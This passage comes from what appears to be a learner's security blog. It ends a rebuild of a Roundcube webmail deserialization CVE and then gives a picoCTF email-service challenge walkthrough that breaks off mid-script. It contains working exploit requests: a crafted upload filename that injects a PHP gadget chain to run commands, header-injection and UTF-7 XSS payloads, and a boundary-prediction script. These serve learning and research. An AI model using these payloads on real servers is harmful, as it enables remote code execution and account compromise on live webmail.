the KEY in the session for our purpose . Which we can control now is just the value which not too useful now. So now we want to find some thing like $_SESSION[\u0026quot;everykey\u0026quot;] = $controlled_value. Find hard in the source code ,you can find there is sth interesting at ./program/actions/settings/upload.php\nNow you can see that it get the value from $_GET[\u0026quot;_from\u0026quot;] without any sanitized. Then replace the (add|edit) and push it value into our SESSION ? Try to upload our images and check the database : POST /?_task=settings\u0026amp;_framed=1\u0026amp;_remote=1\u0026amp;_from=edit-identity\u0026amp;_id=\u0026amp;_uploadid=upload1749641647222\u0026amp;_unlock=loading1749641647222\u0026amp;_action=upload HTTP/1.1 IMAGE Here we go , my \u0026ldquo;identity\u0026rdquo; key go straight into the session now !!! So now we handle the key , now lets try to add a malicious key into our session !!! So by understanding the bug , I can try to create my payload like this . We can combine the \u0026ldquo;!\u0026rdquo; at the key with the value (filename) contains \u0026ldquo;|\u0026rdquo; to create something interesting.\nThe ideas: Normal filename lead to : !identity|\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;everything just data not have the \u0026lsquo;|\u0026rsquo; so just get skipped all\u0026hellip;\u0026hellip;\u0026hellip;.\nMalicious filename which has (\u0026quot;|\u0026quot;) lead to : !identity|\u0026hellip;\u0026hellip;\u0026hellip;(meet the \u0026ldquo;|\u0026ldquo;in filename)\u0026hellip;.. | s:1:\u0026ldquo;a\u0026rdquo;; (\u0026ndash;EVERYTHING SERIALIZED YOU WANT\u0026ndash;)\nPOST /?_task=settings\u0026amp;_framed=1\u0026amp;_remote=1\u0026amp;_from=edit-!identity\u0026amp;_id=\u0026amp;_uploadid=upload1749641647222\u0026amp;_unlock=loading1749641647222\u0026amp;_action=upload HTTP/1.1 ...... STUFFS.. ...... Content-Disposition: form-data; name=\u0026#34;_file[]\u0026#34;; filename=\u0026#34;|s:1:\\\u0026#34;a\\\u0026#34;;inject|O:5:\\\u0026#34;pwned\\\u0026#34;:0:{};\u0026#34; Then dumps database and unserialize to see the result : My OBJECT is created now in the SESSION !!!\nFinal chain : # So the final things we need is a gadget to trigger the chain. Fortunately there\u0026rsquo;s a vendor vulnerable to this !! // vendor/pear/Crypt/GPG/Engine.php public function __destruct() { $this-\u0026gt;_closeSubprocess(); $this-\u0026gt;_closeIdleAgents(); } private function _closeIdleAgents() { if ($this-\u0026gt;_gpgconf) { // before 2.1.13 --homedir wasn\u0026#39;t supported, use env variable $env = array(\u0026#39;GNUPGHOME\u0026#39; =\u0026gt; $this-\u0026gt;_homedir); $cmd = $this-\u0026gt;_gpgconf . \u0026#39; --kill gpg-agent\u0026#39;; if ($process = proc_open($cmd, array(), $pipes, null, $env)) { proc_close($process); } } } So we just need to create an serialize for this one my payload is (in custom serialize form): $seri = \u0026#39;0|O:16:\u0026#34;Crypt_GPG_Engine\u0026#34;:1:{s:8:\u0026#34;_gpgconf\u0026#34;;s:4:\u0026#34;id;#\u0026#34;;}\u0026#39;; The pear has fixed this bug with adding checking if the $this-\u0026gt;_gpconf is executable before add into the $cmd. Then try it on server : POST /?_task=settings\u0026amp;_framed=1\u0026amp;_remote=1\u0026amp;_from=edit-!identity\u0026amp;_id=\u0026amp;_uploadid=upload1749642336188\u0026amp;_unlock=loading1749642336189\u0026amp;_action=upload HTTP/1.1 .... STUFF ...... Content-Disposition: form-data; name=\u0026#34;_file[]\u0026#34;; filename=\u0026#34;|s:1:\\\u0026#34;a\\\u0026#34;;0|O:16:\\\u0026#34;Crypt_GPG_Engine\\\u0026#34;:1:{s:8:\\\u0026#34;_gpgconf\\\u0026#34;;s:4:\\\u0026#34;id;#\\\u0026#34;;}\u0026#34; And look at the logs of server :\nQuestion : # Why we cant put payload into the key ? # If you test this local , it will work !!\n$data = [ \u0026#39;!identity xxx|| b:0;test|O:16:\u0026#34;Crypt_GPG_Engine\u0026#34;:1:{s:8:\u0026#34;_gpgconf\u0026#34;;s:4:\u0026#34;id;#\u0026#34;;}\u0026#39; =\u0026gt; \u0026#39;PWNED2\u0026#39;, ]; --\u0026gt; This work the same But when tries on the server it will fail due to some restrictions. After reading the documents I finally finds the problem. And my current app is implementing a custom session handler :\nini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php\u0026#39;); =\u0026gt; Not allow the \u0026#34;!\u0026#34; and \u0026#34;|\u0026#34; // set custom functions for PHP session management session_set_save_handler( [$this, \u0026#39;open\u0026#39;], [$this, \u0026#39;close\u0026#39;], [$this, \u0026#39;read\u0026#39;], [$this, \u0026#39;sess_write\u0026#39;], [$this, \u0026#39;destroy\u0026#39;], [$this, \u0026#39;gc\u0026#39;] ); It seems the \u0026ldquo;|\u0026rdquo; and \u0026ldquo;!\u0026rdquo; is not allowed in $_SESSION. So why the heck the \u0026ldquo;!\u0026rdquo; in our payload still works\u0026hellip; # In the legacy php session serialization format, both | and ! are special delimiters: These key STILL BE WRITED in $_SESSION but not STORED \u0026ldquo;|\u0026rdquo; separates the session variable name from its serialized value\nuser|s:5:\u0026#34;alice\u0026#34;;roles|a:2:{i:0;s:5:\u0026#34;admin\u0026#34;;i:1;s:6:\u0026#34;editor\u0026#34;;} ==\u0026gt; This is not stored into $_SESSION and NOT give sess_write any data to write into db .\n\u0026ldquo;!\u0026rdquo; is used in php_binary (another legacy format), but not usually in plain php format\n\\0user!s:5:\u0026#34;alice\u0026#34;;\\0roles!a:2:{i:0;s:5:\u0026#34;admin\u0026#34;;i:1;s:6:\u0026#34;editor\u0026#34;;} ==\u0026gt; This just not stored into $_SESSION but still give data for sess_write :)) wtf\nAfter suffering a little bit , i realized that i misunderstood :vv . There\u0026rsquo;s a sanitize at the \u0026ldquo;|\u0026rdquo; in php and the \u0026ldquo;!\u0026rdquo; in php-binary not both . Ok clear documentation :(\nConclusion : # This is my first time trying to rebuild a CVE. This is almost based on the blog I read and try to test on my machine . I think it will be a good start before my trying to build the CVE with just details. Btw, its good to learn the way the author audits the code and find the gadget. Thanks author for a great detail blog. ","date":"12 June 2025","externalUrl":null,"permalink":"/posts/cve/","section":"Posts","summary":"Rebuild CVE-2025-49113 # Source : https://fearsoff.org/research/roundcube\nRoot cause : # Bug at custom unserialization Sink In Secure Deserialization at Pear Crypt package. Introduction: # Roundcub is a free and open source webmail software for the masses, written in PHP. How roundcube handle session ? # It will serialize of data and then base64 encode then store into MYSQL at table session with columns vars. It sound simple right ? But the problem when you try to decode that base64 is : Well you can see that its use a weird structure when comparing to the normal .","title":"Rebuild CVE-2025-49113","type":"posts"},{"content":" Secure Email Service # This is the hardest web challenge from picoCTF. Knowledge : MIME email document structure, Signed Email, Header Injection, Breaking weak cryptography.\nFind the sink : # So the challenge gives us a bot with flag in localStorage and does some stuffs. from os import environ from playwright.async_api import async_playwright, expect import asyncio import re flag = environ.get(\u0026#39;FLAG\u0026#39;, \u0026#39;picoCTF{flag}\u0026#39;) password = environ.get(\u0026#39;PASSWORD\u0026#39;, \u0026#39;admin@ses\u0026#39;) async def bot(): async with asyncio.timeout(12): async with async_playwright() as p: browser = await p.chromium.launch() page = await browser.new_page() await page.goto(\u0026#39;http://127.0.0.1:8000\u0026#39;) await page.evaluate(\u0026#39;flag =\u0026gt; localStorage.setItem(\u0026#34;flag\u0026#34;, flag)\u0026#39;, flag) # login await page.type(\u0026#39;[name=username]\u0026#39;, \u0026#39;admin@ses\u0026#39;) await page.type(\u0026#39;[name=password]\u0026#39;, password) await page.click(\u0026#39;button\u0026#39;) # click on first email await page.wait_for_url(\u0026#39;http://127.0.0.1:8000/inbox.html\u0026#39;, wait_until=\u0026#39;networkidle\u0026#39;) try: await page.click(\u0026#39;tbody tr\u0026#39;, timeout=1000) except: await browser.close() return # click reply button await page.wait_for_url(\u0026#39;http://127.0.0.1:8000/email.html?id=*\u0026#39;, wait_until=\u0026#39;networkidle\u0026#39;) await expect(page.locator(\u0026#39;#reply\u0026#39;)).to_have_attribute(\u0026#39;href\u0026#39;, re.compile(\u0026#39;.*\u0026#39;)) await page.click(\u0026#39;#reply button\u0026#39;) # reply to email await page.wait_for_url(\u0026#39;http://127.0.0.1:8000/reply.html?id=*\u0026#39;, wait_until=\u0026#39;networkidle\u0026#39;) await page.type(\u0026#39;textarea\u0026#39;, \u0026#39;\\n\\n\u0026#39;.join([ \u0026#39;We\\\u0026#39;ve gotten your message and will respond soon.\u0026#39;, \u0026#39;Thank you for choosing SES!\u0026#39;, \u0026#39;Best regards,\u0026#39;, \u0026#39;The Secure Email Service Team\u0026#39; ])) await page.click(\u0026#39;#reply button\u0026#39;) await browser.close() asyncio.run(bot()) Bot actions :\nType admin email and password and login Then click into the first email and visit that email. After that it will reply that email So we must find some vulnerabilities in these action.\nHow the email looks like ? # Email from admin Email from user Looks like there is something difference here.Check the source code we find that. const parsed = await parse(msg.data); document.getElementById(\u0026#39;subject\u0026#39;).innerText = parsed.subject; const replyUrl = new URL(\u0026#39;/reply.html\u0026#39;, origin); replyUrl.searchParams.set(\u0026#39;id\u0026#39;, id); document.getElementById(\u0026#39;reply\u0026#39;).href = replyUrl; const content = document.getElementById(\u0026#39;content\u0026#39;); if (parsed.html) { const signed = await getSigned(msg.data, await rootCert()); if (signed) { const { html } = await parse(signed); const shadow = content.attachShadow({ mode: \u0026#39;closed\u0026#39; }); // Only sink ? shadow.innerHTML = `\u0026lt;style\u0026gt;:host { all: initial }\u0026lt;/style\u0026gt;${html}`; } else { content.style.color = \u0026#39;red\u0026#39;; content.innerText = \u0026#39;invalid signature!\u0026#39;; } } else { const pre = document.createElement(\u0026#39;pre\u0026#39;); pre.style.overflow = \u0026#39;auto\u0026#39;; pre.innerText = parsed.text; content.appendChild(pre); } There are 2 requirements for an email if I want it goes into the sink innerHTML : GOAL =\u0026gt; Create an email contains : # After parsed it contains html field . The msg.data is a valid data after signed with a key. Lets dig into the first requirement. # So how the parse works ? # Oh its look like using a parse.wasm file Which is too terrible to reverse and try to understand\u0026hellip;. After reading the write up I found a trick to check if it comes from any well known library by checking the registry. Now I can know that it uses the mail-parser-0.9.4 at this time. Note that its not the newest version so maybe we can find sth interesting\nBut we need a testing environment , so lets create some email based on context of this challenge . How the email generated from scratch ? # This code handles the flow :\n@app.post(\u0026#39;/api/send\u0026#39;) async def send( user: Annotated[User, Depends(db.request_user)], to: Annotated[str, Body()], subject: Annotated[str, Body()], body: Annotated[str, Body()] ): # make sure the email we\u0026#39;re sending to is valid recipient = await db.get_user(to) if len(user.public_key) == 0: # msg = util.generate_email( sender=user.username, recipient=recipient.username, subject=subject, content=body, ) else: # We control title through subject too msg = util.generate_email( sender=user.username, recipient=recipient.username, subject=subject, content=template.render( title=subject, content=body ), html=True, sign=True, cert=user.public_key, key=user.private_key ) email_id = str(uuid.uuid4()) await db.send_email(recipient, email_id, msg) return email_id And the code to generate the\ndef generate_email( sender: str, recipient: str, subject: str, content: str, html: bool = False, sign: bool = False, cert: str = \u0026#39;\u0026#39;, key: str = \u0026#39;\u0026#39;, ) -\u0026gt; str: msg = MIMEMultipart() msg[\u0026#39;From\u0026#39;] = sender msg[\u0026#39;To\u0026#39;] = recipient msg[\u0026#39;Subject\u0026#39;] = subject msg.attach(MIMEText(content)) if html: msg.attach(MIMEText(content, \u0026#39;html\u0026#39;))\tif sign: return smail.sign_message(msg, key.encode(), cert.encode()).as_string() return msg.as_string() We can see the difference at privileges here. Admin can create a HTML message ans Signed. But the most interesting part is the way it generates the content content=template.render( title=subject, content=body ), And actually its not too easy that the jinja2 cannot be SSTI or Escaped with xss but it should be paid attention\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;email-container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;{{ title }}\u0026lt;/h1\u0026gt; \u0026lt;pre\u0026gt;{{ content }}\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; But it reads the title = subject and content = body. Try to figure out what we can control ? # So now we know that ONLY ADMIN can send an HTML valid email . Because the admin just send email from the reply.html so we just need to focus on this one . const parsed = await parse((await email(id)).data); const subject = `Re: ${parsed.subject}`; document.getElementById(\u0026#39;subject\u0026#39;).innerText = subject; document.getElementById(\u0026#39;reply\u0026#39;).onsubmit = async e =\u0026gt; { e.preventDefault(); const body = document.querySelector(\u0026#39;[name=body]\u0026#39;).value; try { // The destination go through parser first await send(parsed.from, subject, body); } catch(e) { alert(e); return; } First it parse of email and then : Send to parsed.from ? (but this is checked before the email sent to admin so we dont abuse this :v) With subject = parsed.subject ? Both of this is all from the user so lets test to find we can trick it or not. Example of email after parsed. Now we control the Subject right ? Try to inject the headers with Subject:abc\\nFrom:admin@ses Its not a dream ,btw :vv Lets try to audit the code to find the check\nPython looks like block it before . This regex detects lines that start with a non-space, non-tab sequence followed by a colon (:).\nSo we just need to add a space before the \u0026lsquo;:\u0026rsquo; to bypass\nNow get a new error check :D NEWLINE_WITHOUT_FWSP = re.compile(r\u0026#39;\\r\\n[^ \\t]|\\r[^ \\n\\t]|\\n[^ \\t]\u0026#39;) Now i cannot bypass this anymore\u0026hellip; seems a dead end .. Until i realize that Im using a different python version with the docker machine. Lets try again and this really works .Because there\u0026rsquo;s no check at python3.11 msg[\u0026#39;Subject\u0026#39;] = \u0026#34;HIHI\\nFrom :admin@ses\u0026#34; Progress # Now we can abuse the admin bot to send an email to itself !! and which it send to we still not control ? Or we did ? We have header injection which is too powerful , we can just put OUR EMAIL DATA into it ? But first calm down and think about the flow again now . FLOW EMAIL : # We send our subject -\u0026gt; Admin parse it and be abused to reply to itself -\u0026gt; It create a template with our subject -\u0026gt; It send the template . Admin visit the email itself and parse the msg.data -\u0026gt; check parsed -\u0026gt; check signed -\u0026gt; put into html or invalid siganture . - BTW , JUST DUMP ALL OUT ==========ADMIN RECEIVE THIS FROM USER============= Content-Type: multipart/mixed; boundary=\u0026#34;===============7785715794646824541==\u0026#34; MIME-Version: 1.0 From: user@ses To: admin@ses Subject: HIHI From :admin@ses --===============7785715794646824541== Content-Type: text/plain; charset=\u0026#34;us-ascii\u0026#34; MIME-Version: 1.0 Content-Transfer-Encoding: 7bit IM TOO DUMP BRO --===============7785715794646824541==-- ============AFTER PARSING======================= { \u0026#34;from\u0026#34;: \u0026#34;admin@ses\u0026#34;, \u0026#34;html\u0026#34;: null, \u0026#34;subject\u0026#34;: \u0026#34;HIHI\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;IM TOO DUMP BRO\u0026#34;, \u0026#34;to\u0026#34;: \u0026#34;admin@ses\u0026#34; } ==================== ADMIN WILL SIGN THIS ==================== ==================== PUT THE CONTENT=SUBJECT into JINJA======= Content-Type: multipart/mixed; boundary=\u0026#34;===============6803546522554613104==\u0026#34; MIME-Version: 1.0 From: admin@ses To: admin@ses Subject: Re: HIHI --===============6803546522554613104== Content-Type: text/plain; charset=\u0026#34;us-ascii\u0026#34; MIME-Version: 1.0 Content-Transfer-Encoding: 7bit \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;email-container\u0026#34;\u0026gt; ######THIS PLACE WE CONTROL ######### \u0026lt;h1\u0026gt;HIHI\u0026lt;/h1\u0026gt; ######THIS PLACE WE CONTROL ######### \u0026lt;pre\u0026gt;We\u0026amp;#39;ve gotten your message and will respond soon. Thank you for choosing SES! Best regards, The Secure Email Service Team\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; --===============6803546522554613104==-- ==================== ADMIN VISIT SECOND TIME AFTER PARSE==================== { \u0026#34;from\u0026#34;: \u0026#34;admin@ses\u0026#34;, \u0026#34;html\u0026#34;: null, \u0026#34;subject\u0026#34;: \u0026#34;Re: HIHI\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;\u0026lt;!DOCTYPE html\u0026gt;\\n\u0026lt;html\u0026gt;\\n\u0026lt;body\u0026gt;\\n \u0026lt;div class=\\\u0026#34;email-container\\\u0026#34;\u0026gt;\\n \u0026lt;h1\u0026gt;HIHI\u0026lt;/h1\u0026gt;\\n \u0026lt;pre\u0026gt;We\u0026amp;#39;ve gotten your message and will respond soon.\\n\\nThank you for choosing SES!\\n\\nBest regards,\\n\\nThe Secure Email Service Team\u0026lt;/pre\u0026gt;\\n \u0026lt;/div\u0026gt;\\n\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\u0026#34;, \u0026#34;to\u0026#34;: \u0026#34;admin@ses\u0026#34; } SO what if we must do someway to make the Subject after parsed contains something like : subject : \u0026#34;\\n----BOUND----\\n Content-Type:text/html\\n\\nPAYLOAD\\n---BOUND----\\n\u0026#34; ? The idea is INJECTING at the jinja point BUT HOW WE CAN REMAIN THE NEWLINE THROUGH PARSER? # After reading and finding how to add special bytes into headers I found that we can use ENCODING with special structure. def encode_base64(text): encoded_bytes = base64.b64encode(text.encode(\u0026#39;utf-8\u0026#39;)) return f\u0026#39;=?utf-8?B?{encoded_bytes.decode()}?=\u0026#39; You see , we keep the \u0026lsquo;\\n\u0026rsquo; remains which will jumped into the JINJA ? Result in the Resposne : Now we can modify the DATA ! But not really \u0026hellip;. The Boundary is RANDOM ? # If we want to modify this into valid email , we must someway choose the right boundary ? BUt keep it simple here we just try if our payload can work with fixed boundary or not ? Lets try with : payload = f\u0026#39;\\n--fixed2\\nContent-Type : text/html\\n\\n\u0026lt;img src=x onerror=alert()\u0026gt;\\n--fixed2\\n\u0026#39; msg[\u0026#39;Subject\u0026#39;] = f\u0026#34;HIHI{encode_base64(payload)}\\nFrom :admin@ses\u0026#34; It seem get escape ? Its no matter because MIME support ENCODING for data too , so just use UTF-7 ENCODING (THERE IS SOME BUG ON base64 encoding and I dont know the reason why ?) : payload = f\u0026#34;\u0026#34;\u0026#34;hi --==============={admin_boundary}== Content-Type : text/html; charset=utf-7 MIME-Version : 1.0 +ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4- --==============={admin_boundary}== \u0026#34;\u0026#34;\u0026#34; Now our dump will be like this :\n==================== ADMIN WILL SIGN THIS ==================== Content-Type: multipart/mixed; boundary=\u0026#34;===============adminone==\u0026#34; MIME-Version: 1.0 From: admin@ses To: admin@ses Subject: Re: HIHI hi --===============adminone== Content-Type : text/html; charset=utf-7 MIME-Version : 1.0 +ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4- --===============adminone== --===============adminone== Content-Type: text/plain; charset=\u0026#34;us-ascii\u0026#34; MIME-Version: 1.0 Content-Transfer-Encoding: 7bit \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;email-container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;HIHI hi --===============adminone== Content-Type : text/html; charset=utf-7 MIME-Version : 1.0 +ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4- --===============adminone== \u0026lt;/h1\u0026gt; \u0026lt;pre\u0026gt;We\u0026amp;#39;ve gotten your message and will respond soon. Thank you for choosing SES! Best regards, The Secure Email Service Team\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; --===============adminone==-- ==================== ADMIN VISIT SECOND TIME AFTER PARSE==================== { \u0026#34;from\u0026#34;: \u0026#34;admin@ses\u0026#34;, \u0026#34;html\u0026#34;: \u0026#34;--===============adminone==\\nContent-Type: text/plain; charset=\\\u0026#34;us-ascii\\\u0026#34;\\nMIME-Version: 1.0\\nContent-Transfer-Encoding: 7bit\\n\\n\u0026lt;!DOCTYPE html\u0026gt;\\n\u0026lt;html\u0026gt;\\n\u0026lt;body\u0026gt;\\n \u0026lt;div class=\\\u0026#34;email-container\\\u0026#34;\u0026gt;\\n \u0026lt;h1\u0026gt;HIHI hi\\n\\n--===============adminone==\\nContent-Type : text/html; charset=utf-7\\nMIME-Version : 1.0\\n\\n\u0026lt;img src=\\\u0026#34;x\\\u0026#34; onerror=alert(1); /\u0026gt;\\n--===============adminone==\\n\u0026lt;/h1\u0026gt;\\n \u0026lt;pre\u0026gt;We\u0026amp;#39;ve gotten your message and will respond soon.\\n\\nThank you for choosing SES!\\n\\nBest regards,\\n\\nThe Secure Email Service Team\u0026lt;/pre\u0026gt;\\n \u0026lt;/div\u0026gt;\\n\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n--===============adminone==--\\n\u0026#34;, \u0026#34;subject\u0026#34;: \u0026#34;Re: HIHI hi\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;--===============adminone==\\nContent-Type: text/plain; charset=\\\u0026#34;us-ascii\\\u0026#34;\\nMIME-Version: 1.0\\nContent-Transfer-Encoding: 7bit\\n\\n\u0026lt;!DOCTYPE html\u0026gt;\\n\u0026lt;html\u0026gt;\\n\u0026lt;body\u0026gt;\\n \u0026lt;div class=\\\u0026#34;email-container\\\u0026#34;\u0026gt;\\n \u0026lt;h1\u0026gt;HIHI hi\\n\\n--===============adminone==\\nContent-Type : text/html; charset=utf-7\\nMIME-Version : 1.0\\n\\n\u0026lt;img src=\\\u0026#34;x\\\u0026#34; onerror=alert(1); /\u0026gt;\\n--===============adminone==\\n\u0026lt;/h1\u0026gt;\\n \u0026lt;pre\u0026gt;We\u0026amp;#39;ve gotten your message and will respond soon.\\n\\nThank you for choosing SES!\\n\\nBest regards,\\n\\nThe Secure Email Service Team\u0026lt;/pre\u0026gt;\\n \u0026lt;/div\u0026gt;\\n\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n--===============adminone==--\\n\u0026#34;, \u0026#34;to\u0026#34;: \u0026#34;admin@ses\u0026#34; } But after parsed it still not work ? After dynamically testing , i realize that this part make the parser error because its cannot understand the structure due to this point :\nSubject: Re: HIHI hi --===============adminone== Content-Type : text/html; charset=utf-7 MIME-Version : 1.0 +ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4- --===============adminone== THIS CONFUSE THE PARSER --===============adminone== Content-Type: text/plain; charset=\u0026#34;us-ascii\u0026#34; MIME-Version: 1.0 Content-Transfer-Encoding: 7bit But no matters , try it on server to understand why . WHAT HAPPENING HERE ? # Wait what ? Its so non sense right ? But we must remember that , our data will be SIGNED before being parsed !! Here is the real message after signed !! And message is sent by admin so the check signed must be valid because admin does it . Content-Type: multipart/signed; protocol=\u0026#34;application/pkcs7-signature\u0026#34;; micalg=\u0026#34;sha-256\u0026#34;; boundary=\u0026#34;===============admin2==\u0026#34; MIME-Version: 1.0 From: admin@ses To: admin@ses Subject: Re: hi hi --===============adminone== Content-Type : text/html; charset=utf-7 MIME-Version : 1.0 +ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4- --===============adminone== ### THIS PART IS ADDED INTO BETWEEN SUBJECT AND OUR DATA MAKES IT VALID BECAUSE IT DEFINED A BOUNDARY AGAIN :VV ### This is an S/MIME signed message --===============admin2== Content-Type: multipart/mixed; boundary=\u0026#34;===============adminone==\u0026#34; MIME-Version: 1.0 --===============adminone== Content-Type: text/plain; charset=\u0026#34;us-ascii\u0026#34; MIME-Version: 1.0 Content-Transfer-Encoding: 7bit \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;email-container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Re: hi hi --===============adminone== Content-Type : text/html; charset=utf-7 MIME-Version : 1.0 +ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4- --===============adminone== \u0026lt;/h1\u0026gt; \u0026lt;pre\u0026gt;dsad\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; --===============adminone== Content-Type: text/html; charset=\u0026#34;us-ascii\u0026#34; MIME-Version: 1.0 Content-Transfer-Encoding: 7bit \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;email-container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Re: hi hi --===============adminone== Content-Type : text/html; charset=utf-7 MIME-Version : 1.0 +ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4- --===============adminone== \u0026lt;/h1\u0026gt; \u0026lt;pre\u0026gt;dsad\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; --===============adminone==-- --===============admin2== Content-Type: application/pkcs7-signature; name=\u0026#34;smime.p7s\u0026#34; Content-Transfer-Encoding: base64 Content-Disposition: attachment; filename=\u0026#34;smime.p7s\u0026#34; Content-Description: S/MIME Cryptographic Signature MIIFLQYJKoZIhvcNAQcCoIIFHjCCBRoCAQExDzANBglghkgBZQMEAgEFADALBgkqhkiG9w0BBwGg ggMlMIIDITCCAgmgAwIBAgIUHjR1RUpDc9PN3lIb5uOKlA9XHXMwDQYJKoZIhvcNAQELBQAwHjEc MBoGA1UEAwwTc2VjdXJlLW1haWwtc2VydmljZTAeFw0yNTAzMjUwODU2NTFaFw0yNjAzMjUwODU2 NTFaMC4xEjAQBgNVBAMMCWFkbWluQHNlczEYMBYGCSqGSIb3DQEJARYJYWRtaW5Ac2VzMIIBIjAN BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUWmhBhA9+K8pt1LEQx7SD0U+lrEyJjf0WdLX2Ht 4x12eWUN1cAzx/CqH3AUp+cRfBG42CFKT+TTrjz9K8nffUqhhOQpIQ4QtwhwWtHwjaBhRDKwo8mW znr4/cYGdxTyQ+n2eBzFhdBOe5LsO3GLMqYnNFrCPLUHL3DIssOuRiZIdTBkrqeG44SrqWOXna7Z hGOCygabdTZL93ucA2tLbtgW8Zg2/QwwU7f0Xx7HqGKpl7+Prt27gM3bZBRPXT2NU96/eW32Pgq3 qo3rC5jUMo2X+yCDB1PaGvxmbK/HSqCxLORYiRbhPA9vIuX8kUWJf9dtThPrUhXk4T+r+HwxQQID AQABo0cwRTAUBgNVHREEDTALgQlhZG1pbkBzZXMwDgYDVR0PAQH/BAQDAgWgMB0GA1UdJQQWMBQG CCsGAQUFBwMCBggrBgEFBQcDBDANBgkqhkiG9w0BAQsFAAOCAQEAm8mM0x6Xgs8YchYjePkFSpJJ hQzzbhnuCGrOqTJxJqnN9BtfE8aoNxXlnaLl4V3QJHDa1OFGJjErXzvtWa2zGkJZYFRR3Y766rFS 1PngziYCYCYGlpuqm20y0CYAPctZ13TDLd0ZLHuqXdq1/rXo0fqacovPfEzTxcGZdaRufDg/kn1y zSdBbw8XRwomJgwa1H7P9skGmydU1ASMJVonZjw1MY5HQ9MuW6VtmHAMMmy6XzimO477NiigakTc xh+Juc+zXIoPHuH5wGj8gs2fiM99/GSjvJ+PndbBHxP4YlPKLqhfazv/jfpAM27FaT0V5+cKoRWB w84hrdqbfj4EhTGCAcwwggHIAgEBMDYwHjEcMBoGA1UEAwwTc2VjdXJlLW1haWwtc2VydmljZQIU HjR1RUpDc9PN3lIb5uOKlA9XHXMwDQYJYIZIAWUDBAIBBQCgaTAYBgkqhkiG9w0BCQMxCwYJKoZI hvcNAQcBMBwGCSqGSIb3DQEJBTEPFw0yNTAzMjUwOTI1MDRaMC8GCSqGSIb3DQEJBDEiBCCSFpTh K2LQn+v3iRjE7B+4JZVXzLtG4cDt2+/FZtRZ/TANBgkqhkiG9w0BAQEFAASCAQAQMSR1+i6O29/7 jPnuMcvBnD3eEtQSwxKlHVT/2+DxISVxPF7+YDG4TEwZbzSx43BsoVvI/dkak8nuRCdZoErvDU5V Fm50PYeXxAvU4SB4T/mxTyDgsPRe5uBzRKyS2b3Qk+93EFFNHi4PACCIphzL3Tzs2fujqZoiE/pY HFrQKhLqxx7EhxacyBdY82fJ6+/wk8hADBJ8mH3JsLktZQ7BRgsH32le1nJGgk5yBa13Uc5I//UE c/Oe3RqWxoJLzl7m4iL2EEs2Si1U0DqGgtr+MzoUMDA//v4p5W6RWBq5Qn3Lb3r21Zw3IRbcLVAw gu9g3l14WKYRtrY2WZ1eiyXr --===============admin2==-- YOu can see there is a part added between 2 boundary . Test it in local We now can confirm that really affects to the response .\nNOW WE CAN TRIGGER XSS , JUST ONE FINAL THINGS\u0026hellip; # So now we can trigger XSS with only FIXED BOUNDARY right ? So lets audit the code to check if we can predict or crack the random shitty. def _make_boundary(cls ,text=None): # Craft a random boundary. If text is given, ensure that the chosen # boundary doesn\u0026#39;t appear in the text. token = random.randrange(sys.maxsize) boundary = (\u0026#39;=\u0026#39; * 15) + (_fmt % token) + \u0026#39;==\u0026#39; if text is None: return boundary b = boundary counter = 0 while True: cre = cls._compile_re(\u0026#39;^--\u0026#39; + re.escape(b) + \u0026#39;(--)?$\u0026#39;, re.MULTILINE) if not cre.search(text): break b = boundary + \u0026#39;.\u0026#39; + str(counter) counter += 1 return b Im not too good at crypto so I just know there is a tool to crack it by collecting too much boundaries and predict . Here is the script\ndef get_boundary(s) -\u0026gt; int: data = { \u0026#34;to\u0026#34;: \u0026#34;user@ses\u0026#34;, \u0026#34;subject\u0026#34;: \u0026#39;hi\u0026#39;, \u0026#34;body\u0026#34;: \u0026#34;faewfef\u0026#34; } res = s.post(url+\u0026#39;/api/send\u0026#39;,json = data,headers=headers) 